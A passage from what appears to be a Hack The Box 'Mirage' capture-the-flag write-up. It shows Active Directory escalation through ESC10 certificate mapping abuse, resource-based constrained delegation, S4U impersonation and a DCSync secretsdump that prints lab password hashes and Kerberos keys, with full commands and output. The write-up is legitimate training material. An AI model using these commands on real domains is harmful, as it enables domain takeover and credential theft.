distinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
manager: WRITE
mail: WRITE
msDS-HABSeniorityIndex: WRITE
msDS-PhoneticDisplayName: WRITE
msDS-PhoneticCompanyName: WRITE
msDS-PhoneticDepartment: WRITE
msDS-PhoneticLastName: WRITE
msDS-PhoneticFirstName: WRITE
msDS-SourceObjectDN: WRITE
msDS-AllowedToDelegateTo: WRITE
altSecurityIdentities: WRITE
servicePrincipalName: WRITE
userPrincipalName: WRITE
legacyExchangeDN: WRITE
otherMailbox: WRITE
showInAddressBook: WRITE
systemFlags: WRITE
division: WRITE
objectGUID: WRITE
name: WRITE
displayNamePrintable: WRITE
proxyAddresses: WRITE
company: WRITE
department: WRITE
co: WRITE
dn: WRITE
initials: WRITE
givenName: WRITE
description: WRITE
title: WRITE
ou: WRITE
o: WRITE
sn: WRITE
objectCategory: WRITE
cn: WRITE
objectClass: WRITE

distinguishedName: CN=Mirage-Service,CN=Managed Service Accounts,DC=mirage,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
msDS-cloudExtensionAttribute20: WRITE
msDS-cloudExtensionAttribute19: WRITE
msDS-cloudExtensionAttribute18: WRITE
msDS-cloudExtensionAttribute17: WRITE
msDS-cloudExtensionAttribute16: WRITE
msDS-cloudExtensionAttribute15: WRITE
msDS-cloudExtensionAttribute14: WRITE
msDS-cloudExtensionAttribute13: WRITE
msDS-cloudExtensionAttribute12: WRITE
msDS-cloudExtensionAttribute11: WRITE
msDS-cloudExtensionAttribute10: WRITE
msDS-cloudExtensionAttribute9: WRITE
msDS-cloudExtensionAttribute8: WRITE
msDS-cloudExtensionAttribute7: WRITE
msDS-cloudExtensionAttribute6: WRITE
msDS-cloudExtensionAttribute5: WRITE
msDS-cloudExtensionAttribute4: WRITE
msDS-cloudExtensionAttribute3: WRITE
msDS-cloudExtensionAttribute2: WRITE
msDS-cloudExtensionAttribute1: WRITE
msDS-GeoCoordinatesLongitude: WRITE
msDS-GeoCoordinatesLatitude: WRITE
msDS-GeoCoordinatesAltitude: WRITE
msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE
msDS-HostServiceAccount: WRITE
msPKI-CredentialRoamingTokens: WRITE
msDS-FailedInteractiveLogonCountAtLastSuccessfulLogon: WRITE
msDS-FailedInteractiveLogonCount: WRITE
msDS-LastFailedInteractiveLogonTime: WRITE
msDS-LastSuccessfulInteractiveLogonTime: WRITE
msDS-SupportedEncryptionTypes: WRITE
msPKIAccountCredentials: WRITE
msPKIDPAPIMasterKeys: WRITE
msPKIRoamingTimeStamp: WRITE
mSMQDigests: WRITE
mSMQSignCertificates: WRITE
userSharedFolderOther: WRITE
userSharedFolder: WRITE
otherIpPhone: WRITE
ipPhone: WRITE
assistant: WRITE
primaryInternationalISDNNumber: WRITE
primaryTelexNumber: WRITE
otherMobile: WRITE
otherFacsimileTelephoneNumber: WRITE
userCert: WRITE
homePostalAddress: WRITE
personalTitle: WRITE
otherHomePhone: WRITE
streetAddress: WRITE
otherPager: WRITE
info: WRITE
otherTelephone: WRITE
userCertificate: WRITE
preferredDeliveryMethod: WRITE
registeredAddress: WRITE
internationalISDNNumber: WRITE
x121Address: WRITE
facsimileTelephoneNumber: WRITE
teletexTerminalIdentifier: WRITE
telexNumber: WRITE
telephoneNumber: WRITE
physicalDeliveryOfficeName: WRITE
postOfficeBox: WRITE
postalCode: WRITE
postalAddress: WRITE
street: WRITE
st: WRITE
l: WRITE
c: WRITE
```

There are interesting attributes for `mark.bbond` that we have write permissions to.

```bash
msDS-AllowedToDelegateTo: WRITE
altSecurityIdentities: WRITE
servicePrincipalName: WRITE
userPrincipalName: WRITE
```

#### msDS-AllowedToDelegateTo

Since we have write privileges to **mark.bbond**’s `msDS-AllowedToDelegateTo`, we can control which service principal names (SPNs) mark.bbond is allowed to delegate to; by adding suitable SPNs we can obtain service tickets on behalf of a privileged user and access those services as that user effectively allowing us to read/modify sensitive data, execute actions, move laterally, create persistence, and potentially escalate to full domain compromise without needing the privileged user’s password, so delegation misconfigurations are high-severity.

This is possible provided the source account, `mark.bbond`, has the `TRUSTED_TO_AUTH_FOR_DELEGATION` flag set in its `UserAccountControl` attribute.

```powershell
*Evil-WinRM* PS C:\Users\nathan.aadam\Documents> Get-ADUser -Identity mark.bbond -Properties msDS-AllowedToDelegateTo,TrustedForDelegation,TrustedToAuthForDelegation | Format-List msDS-AllowedToDelegateTo,TrustedForDelegation,TrustedToAuthForDelegation


msDS-AllowedToDelegateTo   : {}
TrustedForDelegation       : False
TrustedToAuthForDelegation : False
```

```bash
faketime -f "+7hrs" \
bloodyAD -u 'mirage-service' -k -d mirage.htb --host dc01.mirage.htb get object mark.bbond --attr userAccountControl

distinguishedName: CN=mark.bbond,OU=Users,OU=Support,OU=IT_Staff,DC=mirage,DC=htb
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD
```

In this case we cannot delegate any user since we are 'not trusted for delegation'. 
[[Attributes#msDS-AllowedToDelegateTo]]

#### servicePrincipalName

Having write privileges to the `servicePrincipalName` attribute lets us add an SPN to a user account; once an SPN is present we can request a service ticket (TGS) for that SPN and perform **Kerberoasting**—extracting the TGS for offline cracking to try to recover the service account’s password (or NTLM-equivalent) if the account uses a crackable key.

But we already have the accounts password.

#### userPrincipalName

If you can modify `userPrincipalName`, you can align a target account’s UPN with a privileged account or with the identity expected by a vulnerable certificate template; when an AD CS template permits enrollment based solely on the requested UPN, the CA may issue a certificate asserting that identity. Possession of that certificate allows authentication as the targeted identity (e.g., via PKINIT or client cert auth), so this is a high-impact attack but depends on specific AD CS/template misconfigurations.

#### msDS-AllowedToActOnBehalfOfOtherIdentity

We have write privilege to this attribute on ourself, `mirage-service$`.

The `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute enables **Resource-Based Constrained Delegation (RBCD)** by storing a list of principals (users, computers, or groups) that are permitted to delegate credentials to the account - meaning if you control this attribute on a target computer or service account, you can configure it to allow a compromised account you control to impersonate any user (including administrators) when connecting to that service, effectively granting you privileged access through delegation attacks.

In this case the target account should allow delegation but in our case the target account is `administrator` and does not allow delegation

```bash
faketime -f "+7hrs" \
bloodyAD -u 'mirage-service' -k -d mirage.htb --host dc01.mirage.htb get object Administrator --attr userAccountControl  

distinguishedName: CN=Administrator,CN=Users,DC=mirage,DC=htb
userAccountControl: NORMAL_ACCOUNT; DONT_EXPIRE_PASSWORD; NOT_DELEGATED
```

[[Attributes#msDS-AllowedToActOnBehalfOfOtherIdentity]]


#### ADCS ESC10 – Weak Certificate Mapping

 ADCS ESC10 refers to a specific type of privilege escalation exploit involving Active Directory Certificate Services (ADCS) in a Microsoft Windows environment. The vulnerability allows an attacker with low-level access to impersonate any user, including domain administrators, by leveraging a misconfiguration in how certificates are mapped to user accounts. 

This attack is a refined version of previously documented ADCS exploits, known as ESC9 and ESC10. 

##### How the ADCS ESC10 attack works

The attack is possible when the "strong certificate binding" is disabled or configured weakly on a Domain Controller. This relies on a flawed implementation of certificate-based Kerberos authentication, allowing an attacker to bypass standard security measures. 

The attack sequence follows these general steps: 

1. **Gaining initial access**: The attacker obtains a foothold in the network through an initial compromise, such as a compromised low-privileged user account.
2. **Identifying the misconfiguration**: The attacker checks the domain controller's registry for a specific setting (`StrongCertificateBindingEnforcement = 0`) that indicates weak certificate mapping is enabled.
3. **Abusing `GenericWrite` permissions**: The attacker needs `GenericWrite` permissions over a target user object. This is often the compromised low-privileged account, but it can be any account the attacker has control over.
4. **Manipulating the User Principal Name (UPN)**: Using the `GenericWrite` permissions, the attacker modifies the `sAMAccountName` and `userPrincipalName` (UPN) of their controlled user account to impersonate a high-privileged target account, such as a domain administrator.
5. **Enrolling a malicious certificate**: The attacker enrolls a new certificate in the name of the impersonated user.
6. **Authenticating with the certificate**: The attacker uses this new malicious certificate to authenticate to Active Directory as the privileged target, granting them full control over the domain.
7. **Covering tracks**: To avoid detection, the attacker can use automated tools to revert the UPN change and delete the certificate injection, leaving very little evidence behind. 

The difference between ESC9 and ESC10 

ESC10 is an evolution of ESC9, making the exploit more broadly applicable. 

- **ESC9**: This exploit is limited to a specific vulnerable certificate template that has the `ENROLLEE_SUPPLIES_SUBJECT` setting enabled.
- **ESC10**: This version removes the dependency on a specific certificate template. Instead, it exploits the weak certificate-to-user binding enforcement itself, regardless of the template configuration. 

More details about ADCS ESC10 can be found [here](https://www.hackingarticles.in/adcs-esc10-weak-certificate-mapping/) 
##### Exploitation

###### Indetifying the misconfigaration

```powershell
*Evil-WinRM* PS C:\Users\nathan.aadam> Get-ItemProperty -Path HKLM:\SYSTEM\CurrentControlSet\Services\Kdc -Name StrongCertificateBindingEnforcement


StrongCertificateBindingEnforcement : 1
PSPath                              : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc
PSParentPath                        : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services
PSChildName                         : Kdc
PSDrive                             : HKLM
PSProvider                          : Microsoft.PowerShell.Core\Registry
```

- **0 = Disabled** — Certificate mapping is based **only on UPN**, and **SID validation is skipped**. This setting makes the domain **fully exploitable** by ESC10 and other certificate abuse attacks.
- **1 = Compatibility mode** — Tries to enforce SID binding when possible but falls back to UPN matching if SID is missing. Still **partially vulnerable**.
- **2 = Strict** — Requires **SID mapping**, effectively **mitigating ESC10**.

> [!NOTE]
> **Value 1 = Compatibility / audit mode.** The KDC will _check_ for strong certificate→user mappings and attempt to validate the certificate (SID extension, explicit mapping, etc.), but if it cannot find a strong mapping it will **still allow authentication** — while logging diagnostic events so you can find weak/unsafe mappings. In enforcement mode (`=2`) the KDC would _deny_ authentication when no strong mapping exists.

###### Manipulating the User Principal Name

As `mirage-service$` we can write to `mark.bbond's` `UPN` attribute.

```bash
faketime -f "+7hrs" \
certipy-ad account update -u 'mirage-service$' -k -target dc01.mirage.htb -user 'mark.bbond' -upn 'Administrator' -dc-ip 10.10.11.78
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : Administrator
[*] Successfully updated 'mark.bbond'
```


###### Enrolling a malicious certificate

```bash
faketime -f "+7hrs" \
certipy-ad req -u 'mark.bbond' -p '1day@atime' -k -target dc01.mirage.htb -ca 'mirage-DC01-CA' -template 'User' -dc-ip 10.10.11.78 -dc-host dc01.mirage.htb 
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Request ID is 13
[*] Successfully requested certificate
[*] Got certificate with UPN 'Administrator'
[*] Certificate object SID is 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Saving certificate and private key to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'
```

###### Revert the UPN for mark.bbond

```bash
faketime -f "+7hrs" \
> certipy-ad account update -u 'mirage-service$' -k -target dc01.mirage.htb -user 'mark.bbond' -upn 'mark.bbond' -dc-ip 10.10.11.78
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : mark.bbond
[*] Successfully updated 'mark.bbond'
```

###### Authenticating with the certificate

```bash
faketime -f "+7hrs" \
certipy-ad auth -pfx administrator.pfx -domain mirage.htb -dc-ip 10.10.11.78
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'Administrator'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Using principal: 'administrator@mirage.htb'
[*] Trying to get TGT...
[-] Object SID mismatch between certificate and user 'administrator'
[-] Verify that user 'administrator' has object SID 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[-] See the wiki for more information
```

We are getting a UPN and SID mismatch error. The SID is for `mark.bbond` as shown below.

```powershell
*Evil-WinRM* PS C:\Users\nathan.aadam> Get-ADUser -identity mark.bbond | Format-List Name,SID


Name : mark.bbond
SID  : S-1-5-21-2127163471-3824721834-2568365109-1109
```


Trying to get an ldap-shell, we get a session as `mark.bbond` even though the UPN is set to `administrator`

```bash
faketime -f "+7hrs" \
certipy-ad auth -pfx administrator.pfx -domain mirage.htb -dc-ip 10.10.11.78 -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Connecting to 'ldaps://10.10.11.78:636'
[*] Authenticated to '10.10.11.78' as: 'u:MIRAGE\\mark.bbond'
Type help for list of commands

# whoami
u:MIRAGE\mark.bbond
```

in Bloodhound `DC01` can perform `DCSync` on `mirage.htb` domain 

![[Pasted_image_20250927115033.png]]

Let's try to get a certificate for the computer account then try to perform `DCSync` attack on the domain.

```bash
faketime -f "+7hrs" \
certipy-ad account update \                                        
  -user 'mark.bbond' \
  -upn 'dc01$' \           
  -u 'mirage-service$@mirage.htb' \
  -k -no-pass \
  -dc-ip 10.10.11.78 \
  -target dc01.mirage.htb
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Updating user 'mark.bbond':
    userPrincipalName                   : dc01$
[*] Successfully updated 'mark.bbond'

```
Got same error when trying to authenticate using the certificate.

Came to realize lter that the issue is because i was using `mirage-service$'s` ticket to authenticate instead of `mark.bbond's` ticket. (i had not updated the value of KRB5CCNAME)

Using the right ticket we get access as `dc01$`

```bash
faketime -f "+7hrs" \
certipy-ad auth -pfx dc01.pfx -dc-ip 10.10.11.78 -ldap-shell
Certipy v5.0.2 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'dc01$@mirage.htb'
[*]     Security Extension SID: 'S-1-5-21-2127163471-3824721834-2568365109-1109'
[*] Connecting to 'ldaps://10.10.11.78:636'
[*] Authenticated to '10.10.11.78' as: 'u:MIRAGE\\DC01$'
Type help for list of commands

# whoami
u:MIRAGE\DC01$
```

We then set `nathan.aadam` to be able to  impersonate any user in `dc01` 

```bash
# set_rbcd dc01$ nathan.aadam
Found Target DN: CN=DC01,OU=Domain Controllers,DC=mirage,DC=htb
Target SID: S-1-5-21-2127163471-3824721834-2568365109-1000

Found Grantee DN: CN=nathan.aadam,OU=Users,OU=Admins,OU=IT_Staff,DC=mirage,DC=htb
Grantee SID: S-1-5-21-2127163471-3824721834-2568365109-1110
Currently allowed sids:
    S-1-5-21-2127163471-3824721834-2568365109-1112
Delegation rights modified successfully!
nathan.aadam can now impersonate users on dc01$ via S4U2Proxy
```

The we impersonate `dc01$`

```bash
faketime -f "+7hrs" \
impacket-getST -spn 'CIFS/dc01.mirage.htb' -impersonate 'DC01$' 'MIRAGE.HTB/nathan.aadam:3edc#EDC3' -k
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for user
[*] Impersonating DC01$
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in DC01$@CIFS_dc01.mirage.htb@MIRAGE.HTB.ccache
```

export the ticket then dump the hashes

```bash
export KRB5CCNAME='DC01$@CIFS_dc01.mirage.htb@MIRAGE.HTB.ccache'
```

```bash
faketime -f "+7hrs" \                                           
impacket-secretsdump -k -no-pass dc01.mirage.htb
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] Policy SPN target name validation might be restricting full DRSUAPI dump. Try -just-dc-user
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
mirage.htb\Administrator:500:aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1adcc3d4a7f007ca8ab8a3a671a66127:::
mirage.htb\Dev_Account_A:1104:aad3b435b51404eeaad3b435b51404ee:3db621dd880ebe4d22351480176dba13:::
mirage.htb\Dev_Account_B:1105:aad3b435b51404eeaad3b435b51404ee:fd1a971892bfd046fc5dd9fb8a5db0b3:::
mirage.htb\david.jjackson:1107:aad3b435b51404eeaad3b435b51404ee:ce781520ff23cdfe2a6f7d274c6447f8:::
mirage.htb\javier.mmarshall:1108:aad3b435b51404eeaad3b435b51404ee:694fba7016ea1abd4f36d188b3983d84:::
mirage.htb\mark.bbond:1109:aad3b435b51404eeaad3b435b51404ee:8fe1f7f9e9148b3bdeb368f9ff7645eb:::
mirage.htb\nathan.aadam:1110:aad3b435b51404eeaad3b435b51404ee:1cdd3c6d19586fd3a8120b89571a04eb:::
mirage.htb\svc_mirage:2604:aad3b435b51404eeaad3b435b51404ee:fc525c9683e8fe067095ba2ddc971889:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:b5b26ce83b5ad77439042fbf9246c86c:::
Mirage-Service$:1112:aad3b435b51404eeaad3b435b51404ee:dbac2122c1f3a94559ab8c40293f5f3b:::
[*] Kerberos keys grabbed
mirage.htb\Administrator:aes256-cts-hmac-sha1-96:09454bbc6da252ac958d0eaa211293070bce0a567c0e08da5406ad0bce4bdca7
mirage.htb\Administrator:aes128-cts-hmac-sha1-96:47aa953930634377bad3a00da2e36c07
mirage.htb\Administrator:des-cbc-md5:e02a73baa10b8619
krbtgt:aes256-cts-hmac-sha1-96:95f7af8ea1bae174de9666c99a9b9edeac0ca15e70c7246cab3f83047c059603
krbtgt:aes128-cts-hmac-sha1-96:6f790222a7ee5ba9d2776f6ee71d1bfb
krbtgt:des-cbc-md5:8cd65e54d343ba25
mirage.htb\Dev_Account_A:aes256-cts-hmac-sha1-96:e4a6658ff9ee0d2a097864d6e89218287691bf905680e0078a8e41498f33fd9a
mirage.htb\Dev_Account_A:aes128-cts-hmac-sha1-96:ceee67c4feca95b946e78d89cb8b4c15
mirage.htb\Dev_Account_A:des-cbc-md5:26dce5389b921a52
mirage.htb\Dev_Account_B:aes256-cts-hmac-sha1-96:5c320d4bef414f6a202523adfe2ef75526ff4fc6f943aaa0833a50d102f7a95d
mirage.htb\Dev_Account_B:aes128-cts-hmac-sha1-96:e05bdceb6b470755cd01fab2f526b6c0
mirage.htb\Dev_Account_B:des-cbc-md5:e5d07f57e926ecda
mirage.htb\david.jjackson:aes256-cts-hmac-sha1-96:3480514043b05841ecf08dfbf33d81d361e51a6d03ff0c3f6d51bfec7f09dbdb
mirage.htb\david.jjackson:aes128-cts-hmac-sha1-96:bd841caf9cd85366d254cd855e61cd5e
mirage.htb\david.jjackson:des-cbc-md5:76ef68d529459bbc
mirage.htb\javier.mmarshall:aes256-cts-hmac-sha1-96:20acfd56be43c1123b3428afa66bb504a9b32d87c3269277e6c917bf0e425502
mirage.htb\javier.mmarshall:aes128-cts-hmac-sha1-96:9d2fc7611e15be6fe16538ebb3b2ad6a
mirage.htb\javier.mmarshall:des-cbc-md5:6b3d51897fdc3237
mirage.htb\mark.bbond:aes256-cts-hmac-sha1-96:dc423caaf884bb869368859c59779a757ff38a88bdf4197a4a284b599531cd27
mirage.htb\mark.bbond:aes128-cts-hmac-sha1-96:78fcb9736fbafe245c7b52e72339165d
mirage.htb\mark.bbond:des-cbc-md5:d929fb462ae361a7
mirage.htb\nathan.aadam:aes256-cts-hmac-sha1-96:b536033ac796c7047bcfd47c94e315aea1576a97ff371e2be2e0250cce64375b
mirage.htb\nathan.aadam:aes128-cts-hmac-sha1-96:b1097eb42fd74827c6d8102a657e28ff
mirage.htb\nathan.aadam:des-cbc-md5:5137a74f40f483c7
mirage.htb\svc_mirage:aes256-cts-hmac-sha1-96:937efa5352253096b3b2e1d31a9f378f422d9e357a5d4b3af0d260ba1320ba5e
mirage.htb\svc_mirage:aes128-cts-hmac-sha1-96:8d382d597b707379a254c60b85574ab1
mirage.htb\svc_mirage:des-cbc-md5:2f13c12f9d5d6708
DC01$:aes256-cts-hmac-sha1-96:4a85665cd877c7b5179c508e5bc4bad63eafe514f7cedb0543930431ef1e422b
DC01$:aes128-cts-hmac-sha1-96:94aa2a6d9e156b7e8c03a9aad4af2cc1
DC01$:des-cbc-md5:cb19ce2c733b3ba8
Mirage-Service$:aes256-cts-hmac-sha1-96:21fd52d5bf7c9f2a8f7ecdedfd247da216094297a81d55399991d49eba497e4b
Mirage-Service$:aes128-cts-hmac-sha1-96:626f0c9dce347362227c2533d0a06f4c
Mirage-Service$:des-cbc-md5:c42ffd455b91f208
[*] Cleaning up... 
```

Request administrator's ticket

```bash
faketime -f "+7hrs" \
impacket-getTGT mirage.htb/administrator: -hashes aad3b435b51404eeaad3b435b51404ee:7be6d4f3c2b9c0e3560f5a29eeb1afb3
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Saving ticket in administrator.ccache
```

```bash
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/mirage]
└─$ export KRB5CCNAME=administrator.ccache 
                                                                              
┌──(darklight㉿jinx)-[~/…/ctf/htb/machines/mirage]
└─$ faketime -f "+7hrs" \                 
evil-winrm -i dc01.mirage.htb -r mirage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
1e284a1d7f18b0dd4b1987d0ef1fb78f
*Evil-WinRM* PS C:\Users\Administrator\Desktop> 
```